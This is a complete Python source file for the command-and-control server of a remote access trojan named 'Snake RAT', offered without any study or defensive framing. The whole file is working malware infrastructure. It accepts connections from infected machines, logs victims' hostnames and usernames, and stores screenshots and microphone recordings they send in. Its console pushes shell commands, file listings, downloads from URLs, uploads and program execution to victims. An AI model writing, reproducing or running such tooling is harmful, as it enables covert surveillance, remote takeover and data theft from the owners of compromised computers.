#!/usr/bin/env python3
"""
Complete C2 Server for Snake RAT
Handles all commands, file transfers, sessions, and persistent connections
"""

import socket
import threading
import json
import os
import base64
from datetime import datetime
import sqlite3
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import hashlib

# Configuration
HOST = '0.0.0.0'
PORT = 4444
C2_KEY = b"supersecretkey123456"  # Must match client
AES_KEY = hashlib.sha256(C2_KEY).digest()[:16]

class C2Server:
    def __init__(self):
        self.clients = {}
        self.db_conn = self.init_database()
        self.running = True
        
    def init_database(self):
        """Initialize SQLite database for logging"""
        conn = sqlite3.connect('c2_logs.db', check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS sessions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                client_id TEXT UNIQUE,
                ip TEXT,
                first_seen TIMESTAMP,
                last_seen TIMESTAMP,
                hostname TEXT,
                username TEXT,
                status TEXT
            )
        ''')
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                client_id TEXT,
                command TEXT,
                output TEXT,
                timestamp TIMESTAMP
            )
        ''')
        conn.commit()
        return conn
    
    def encrypt_data(self, data):
        """AES encrypt data"""
        cipher = AES.new(AES_KEY, AES.MODE_CBC)
        ct_bytes = cipher.encrypt(pad(data.encode(), AES.block_size))
        return base64.b64encode(cipher.iv + ct_bytes).decode()
    
    def decrypt_data(self, data):
        """AES decrypt data"""
        try:
            raw = base64.b64decode(data.encode())
            iv = raw[:16]
            ct = raw[16:]
            cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
            pt = unpad(cipher.decrypt(ct), AES.block_size)
            return pt.decode('utf-8', errors='ignore')
        except:
            return ""
    
    def log_session(self, client_id, ip, hostname, username):
        """Log new session"""
        cursor = self.db_conn.cursor()
        cursor.execute('''
            INSERT OR REPLACE INTO sessions (client_id, ip, first_seen, last_seen, hostname, username, status)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        ''', (client_id, ip, datetime.now(), datetime.now(), hostname, username, 'active'))
        self.db_conn.commit()
    
    def update_session(self, client_id):
        """Update last seen"""
        cursor = self.db_conn.cursor()
        cursor.execute('UPDATE sessions SET last_seen = ? WHERE client_id = ?', 
                      (datetime.now(), client_id))
        self.db_conn.commit()
    
    def log_command(self, client_id, command, output):
        """Log command execution"""
        cursor = self.db_conn.cursor()
        cursor.execute('INSERT INTO commands (client_id, command, output, timestamp) VALUES (?, ?, ?, ?)',
                      (client_id, command, output, datetime.now()))
        self.db_conn.commit()
    
    def handle_client(self, client_socket, addr):
        """Handle individual client connection"""
        client_id = f"{addr[0]}:{addr[1]}"
        print(f"[+] New connection from {addr[0]}:{addr[1]}")
        
        # Send initial system info request
        client_socket.send(self.encrypt_data("SYSINFO").encode())
        
        try:
            while self.running:
                # Receive data
                data = client_socket.recv(4096)
                if not data:
                    break
                
                decrypted = self.decrypt_data(data.decode())
                self.process_data(client_id, addr, decrypted, client_socket)
                
        except Exception as e:
            print(f"[-] Client {client_id} disconnected: {e}")
        finally:
            self.clients.pop(client_id, None)
            cursor = self.db_conn.cursor()
            cursor.execute('UPDATE sessions SET status = ? WHERE client_id = ?', 
                          ('inactive', client_id))
            self.db_conn.commit()
            client_socket.close()
    
    def process_data(self, client_id, addr, data, client_socket):
        """Process incoming data from client"""
        self.update_session(client_id)
        
        if data.startswith("SYSINFO:"):
            # Parse system info
            sysinfo = data[8:]
            lines = sysinfo.split('\n')
            hostname = lines[1].split(':')[1].strip() if len(lines) > 1 else "Unknown"
            username = lines[2].split(':')[1].strip() if len(lines) > 2 else "Unknown"
            
            self.log_session(client_id, addr[0], hostname, username)
            print(f"[+] Session established: {client_id} ({hostname}@{username})")
            
            self.clients[client_id] = {
                'socket': client_socket,
                'addr': addr,
                'hostname': hostname,
                'username': username,
                'last_seen': datetime.now()
            }
            
        elif data.startswith("SCREENSHOT:"):
            # Save screenshot
            screenshot_data = data[10:]
            filename = f"screenshots/{client_id}_{int(datetime.now().timestamp())}.png"
            os.makedirs("screenshots", exist_ok=True)
            with open(filename, 'wb') as f:
                f.write(base64.b64decode(screenshot_data))
            print(f"[+] Screenshot saved: {filename}")
            
        elif data.startswith("AUDIO:"):
            # Save audio
            audio_data = data[6:]
            filename = f"audio/{client_id}_{int(datetime.now().timestamp())}.wav"
            os.makedirs("audio", exist_ok=True)
            with open(filename, 'wb') as f:
                f.write(base64.b64decode(audio_data))
            print(f"[+] Audio saved: {filename}")
            
        elif data.startswith("CMD_RESULT:"):
            output = data[11:]
            print(f"[+] {client_id} CMD OUTPUT:\n{output}")
            self.log_command(client_id, "last_cmd", output)
            
        elif data.startswith("FILES:"):
            files = data[6:]
            print(f"[+] {client_id} Files:\n{files}")
            
        elif data.startswith("DOWNLOAD_RESULT:"):
            result = data[16:]
            print(f"[+] Download result: {result}")
            
        elif data.startswith("UPLOAD_RESULT:"):
            result = data[15:]
            print(f"[+] Upload result: {result}")
            
        elif data.startswith("RUN_RESULT:"):
            result = data[12:]
            print(f"[+] Run result: {result}")
    
    def send_command(self, client_id, command):
        """Send command to specific client"""
        if client_id in self.clients:
            try:
                self.clients[client_id]['socket'].send(self.encrypt_data(command).encode())
                print(f"[*] Sent to {client_id}: {command}")
                return True
            except:
                print(f"[-] Failed to send command to {client_id}")
                return False
        else:
            print(f"[-] Client {client_id} not connected")
            return False
    
    def list_clients(self):
        """List all active clients"""
        print("\n=== ACTIVE SESSIONS ===")
        for client_id, info in self.clients.items():
            print(f"ID: {client_id}")
            print(f"  IP: {info['addr']}")
            print(f"  Host: {info['hostname']}")
            print(f"  User: {info['username']}")
            print(f"  Last: {info['last_seen']}")
            print()
    
    def interactive_shell(self):
        """Interactive C2 console"""
        print("\n=== C2 INTERACTIVE CONSOLE ===")
        print("Commands: clients, screenshot <id>, audio <id> <sec>, cmd <id> <command>")
        print("        list <id> <path>, download <id> <url> <filename>")
        print("        upload <id> <localfile>, run <id> <filename>, exit")
        
        while self.running:
            try:
                cmd = input(f"C2> ").strip()
                
                if cmd == "exit" or cmd == "quit":
                    self.running = False
                    break
                elif cmd == "clients":
                    self.list_clients()
                elif cmd.startswith("screenshot "):
                    client_id = cmd.split(" ")[1]
                    self.send_command(client_id, "SCREENSHOT")
                elif cmd.startswith("audio "):
                    parts = cmd.split(" ")
                    client_id, duration = parts[1], int(parts[2]) if len(parts) > 2 else 10
                    self.send_command(client_id, f"AUDIO:{duration}")
                elif cmd.startswith("cmd "):
                    parts = cmd.split(" ", 2)
                    client_id, command = parts[1], parts[2]
                    self.send_command(client_id, f"CMD:{command}")
                elif cmd.startswith("list "):
                    parts = cmd.split(" ", 2)
                    client_id, path = parts[1], parts[2] if len(parts) > 2 else "."
                    self.send_command(client_id, f"LIST:{path}")
                elif cmd.startswith("download "):
                    parts = cmd.split(" ", 3)
                    client_id, url, filename = parts[1], parts[2], parts[3]
                    self.send_command(client_id, f"DOWNLOAD:{url}:{filename}")
                elif cmd.startswith("upload "):
                    parts = cmd.split(" ", 2)
                    client_id, filename = parts[1], parts[2]
                    self.send_command(client_id, f"UPLOAD:{filename}")
                elif cmd.startswith("run "):
                    parts = cmd.split(" ", 2)
                    client_id, filename = parts[1], parts[2]
                    self.send_command(client_id, f"RUN:{filename}")
                else:
                    print("Unknown command")
                    
            except KeyboardInterrupt:
                print("\n[*] Shutting down...")
                self.running = False
                break
            except Exception as e:
                print(f"Error: {e}")
    
    def start_server(self):
        """Start the C2 server"""
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind((HOST, PORT))
        server_socket.listen(10)
        
        print(f"[+] C2 Server started on {HOST}:{PORT}")
        print("[+] Waiting for victims...")
        
        # Start interactive shell in main thread
        shell_thread = threading.Thread(target=self.interactive_shell)
        shell_thread.daemon = True
        shell_thread.start()
        
        # Accept clients
        while self.running:
            try:
                client_socket, addr = server_socket.accept()
                client_thread = threading.Thread(
                    target=self.handle_client, 
                    args=(client_socket, addr)
                )
                client_thread.daemon = True
                client_thread.start()
            except:
                break
        
        server_socket.close()

if __name__ == "__main__":
    # Create directories
    os.makedirs("screenshots", exist_ok=True)
    os.makedirs("audio", exist_ok=True)
    
    server = C2Server()
    try:
        server.start_server()
    except KeyboardInterrupt:
        print("\n[*] Server shutdown")
    finally:
        server.db_conn.close()
